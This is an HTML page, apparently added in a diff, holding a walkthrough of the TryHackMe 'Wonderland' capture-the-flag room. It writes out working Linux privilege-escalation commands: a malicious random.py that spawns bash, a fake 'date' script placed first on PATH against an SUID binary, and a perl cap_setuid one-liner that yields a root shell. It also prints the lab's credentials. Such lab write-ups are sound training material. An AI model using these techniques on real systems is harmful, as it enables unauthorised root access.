@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Wonderland — TryHackMe walkthrough</title>
+<meta name="description" content="Walkthrough for the Wonderland room on TryHackMe: directory discovery, Python module hijack, PATH hijack, and Perl capability-based privilege escalation." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/wonderland.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> TryHackMe</div>
+    <h1><em>Wonderland</em></h1>
+    <div class="wt-meta">
+      <span class="badge medium">Medium</span>
+      <span class="badge tag">linux</span>
+      <span class="badge tag">python-hijack</span>
+      <span class="badge tag">path-hijack</span>
+      <span class="badge tag">capabilities</span>
+    </div>
+    <p class="wt-summary">
+      An Alice-in-Wonderland themed box that chains three distinct privilege escalation
+      techniques back to back: a Python module hijack through <code>sudo</code>, a PATH
+      hijack on an SUID binary, and finally Linux capabilities on <code>perl</code>.
+      A small textbook of Linux post-exploitation.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#rabbit">Down the rabbit hole</a></li>
+      <li><a href="#alice">alice → rabbit (Python hijack)</a></li>
+      <li><a href="#rabbit-hatter">rabbit → hatter (PATH hijack)</a></li>
+      <li><a href="#hatter-root">hatter → root (perl capability)</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sC -sV -p- -T4 10.10.X.X -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Follow the White Rabbit.</code></pre>
+
+  <p>Two ports. The web page at port 80 just says <em>"Follow the White Rabbit."</em> with a small rabbit icon. Viewing the source doesn't reveal much, so fuzz for directories:</p>
+
+  <pre><code>gobuster dir -u http://10.10.X.X/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -t 40 -x html,php,txt -o gobuster.txt</code></pre>
+
+  <p><code>/r</code> shows up. Visiting <code>/r</code> gives another hint and the word <em>"rabbit"</em>. The trick here is that each letter of <code>rabbit</code> is a directory:</p>
+
+  <h2 id="rabbit"><span class="num">02</span> Down the rabbit hole</h2>
+
+  <p>Walk the path manually:</p>
+
+  <pre><code>/r  →  /r/a  →  /r/a/b  →  /r/a/b/b  →  /r/a/b/b/i  →  /r/a/b/b/i/t</code></pre>
+
+  <p>The final page shows an Alice quote. View the HTML source:</p>
+
+  <pre><code>curl http://10.10.X.X/r/a/b/b/i/t/ | less</code></pre>
+
+  <pre class="output"><code>&lt;!--
+Don't forget to collect the key. alice:HowDothTheLittleCrocodileImproveHisShiningTail
+--&gt;</code></pre>
+
+  <p>Credentials: <code>alice : HowDothTheLittleCrocodileImproveHisShiningTail</code>. Straight into SSH:</p>
+
+  <pre><code>ssh alice@10.10.X.X</code></pre>
+
+  <h2 id="alice"><span class="num">03</span> alice → rabbit (Python module hijack)</h2>
+
+  <p>Look around alice's home:</p>
+  <pre><code>ls -la</code></pre>
+  <pre class="output"><code>-r-------- 1 root  root   66 root.txt
+-rwxr-xr-x 1 root  root  225 walrus_and_the_carpenter.py</code></pre>
+
+  <p>Note that <code>root.txt</code> here is not alice's flag — it's a decoy owned by root. The actual user flag is hiding elsewhere in the chain. Check sudo rights:</p>
+
+  <pre><code>sudo -l</code></pre>
+  <pre class="output"><code>User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code></pre>
+
+  <p>alice can run that one Python script as <code>rabbit</code>. Read it:</p>
+
+  <pre><code>cat walrus_and_the_carpenter.py</code></pre>
+  <pre class="output"><code>import random
+poem = """The sun was shining on the sea,...
+..."""
+for i in range(10):
+    line = random.choice(poem.split("\n"))
+    print("The line was: ", line)</code></pre>
+
+  <p>The script imports <code>random</code>. Python's import lookup checks the script's own directory <em>first</em>, so any <code>random.py</code> sitting next to <code>walrus_and_the_carpenter.py</code> takes priority over the standard library. Classic module hijack.</p>
+
+  <div class="note">
+    alice doesn't own that directory, but <code>/home/alice</code> is world-writable on this box (check with <code>ls -ld /home/alice</code>) — which is what makes the hijack possible. If it weren't, we'd have to drop <code>random.py</code> somewhere on <code>PYTHONPATH</code>.
+  </div>
+
+  <p>Drop a malicious <code>random.py</code>:</p>
+
+  <pre class="exploit"><code>cat &gt; /home/alice/random.py &lt;&lt;'EOF'
+import os
+os.system("/bin/bash -p")
+EOF</code></pre>
+
+  <p>Now run the sudo command:</p>
+  <pre><code>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+# id → uid=1002(rabbit) ...</code></pre>
+
+  <p>Shell as <code>rabbit</code>. Collect the user flag:</p>
+  <pre><code>cat /home/rabbit/user.txt    # or /root/user.txt depending on version — see below</code></pre>
+
+  <div class="note">
+    On Wonderland the flags are deliberately shuffled between users' home directories — <code>root.txt</code> sometimes lives in alice's home (but needs root to read), <code>user.txt</code> in <code>/root/</code>, etc. Just <code>cat</code> each flag file you encounter as you escalate; the theme is "nothing is where you expect".
+  </div>
+
+  <h2 id="rabbit-hatter"><span class="num">04</span> rabbit → hatter (PATH hijack)</h2>
+
+  <p>Enumerate rabbit's home:</p>
+  <pre><code>cd /home/rabbit &amp;&amp; ls -la</code></pre>
+  <pre class="output"><code>-rwsr-sr-x 1 hatter hatter 16816 teaParty</code></pre>
+
+  <p>SUID binary owned by <code>hatter</code>. Poke at it:</p>
+  <pre><code>./teaParty</code></pre>
+  <pre class="output"><code>Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Tue, 15 Sep 2026 17:41:13 +0000
+Ask very nicely, and I will give you some tea while you wait for him</code></pre>
+
+  <p>The date string is the giveaway — it's calling out to <code>date</code>. Confirm with <code>strings</code>:</p>
+
+  <pre><code>strings /home/rabbit/teaParty | grep -Ei "date|echo|bash"</code></pre>
+  <pre class="output"><code>/bin/echo -n 'Probably by '
+date --date='next hour' -R
+Ask very nicely, and I will...</code></pre>
+
+  <p>Actually it calls <code>date</code> <strong>without a full path</strong> (despite the <code>strings</code> output showing <code>/bin/echo</code>, the <code>date</code> call is relative — verify by running <code>ltrace ./teaParty</code> if available, or just try the hijack). That means we can put a malicious <code>date</code> earlier in <code>PATH</code>:</p>
+
+  <pre class="exploit"><code>cd /tmp
+cat &gt; date &lt;&lt;'EOF'
+#!/bin/bash
+/bin/bash -p
+EOF
+chmod +x date
+export PATH=/tmp:$PATH
+/home/rabbit/teaParty
+# id → uid=1003(hatter) ...</code></pre>
+
+  <p>Shell as <code>hatter</code>. Spawn a proper TTY if you haven't already.</p>
+
+  <h2 id="hatter-root"><span class="num">05</span> hatter → root (perl capability)</h2>
+
+  <p>Inside hatter's home:</p>
+  <pre><code>cat /home/hatter/password.txt</code></pre>
+  <pre class="output"><code>WhyIsARavenLikeAWritingDesk?</code></pre>
+
+  <p>If you only pivoted via <code>teaParty</code> (not a full SSH session), log in properly with this password so you have a clean environment:</p>
+  <pre><code>ssh hatter@10.10.X.X</code></pre>
+
+  <p>Now check Linux capabilities — a recurring privesc vector that <code>sudo -l</code> and SUID checks miss:</p>
+
+  <pre><code>getcap -r / 2>/dev/null</code></pre>
+  <pre class="output"><code>/usr/bin/perl = cap_setuid+ep</code></pre>
+
+  <p><code>cap_setuid+ep</code> on <code>perl</code> means any perl script can call <code>setuid(0)</code> and actually transition to root, despite perl not being SUID. Straight from GTFOBins:</p>
+
+  <pre class="exploit"><code>/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+# id → uid=0(root) gid=1004(hatter) euid=0(root)</code></pre>
+
+  <p>Root shell. Grab the final flag:</p>
+  <pre><code>cat /root/root.txt</code></pre>
+
+  <h2><span class="num">06</span> Wrap-up</h2>
+
+  <p>Three distinct privesc patterns in a single box, which is what makes Wonderland great practice:</p>
+  <ul>
+    <li><strong>Python module hijack</strong> — script imports a module, we drop a same-named <code>.py</code> in its directory and it gets loaded first.</li>
+    <li><strong>PATH hijack</strong> — SUID binary calls an external command by relative name; we inject <code>/tmp</code> at the front of <code>PATH</code>.</li>
+    <li><strong>Capabilities</strong> — <code>cap_setuid</code> on an interpreter = game over. Always run <code>getcap -r /</code>.</li>
+  </ul>
+
+  <p>The enumeration muscle memory to take away: <code>sudo -l</code>, <code>find / -perm -4000</code>, <code>getcap -r /</code>, and read the scripts you can run before assuming anything.</p>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>TryHackMe · Wonderland</div>
+  </footer>
+
+</div>
+</body>
+</html>
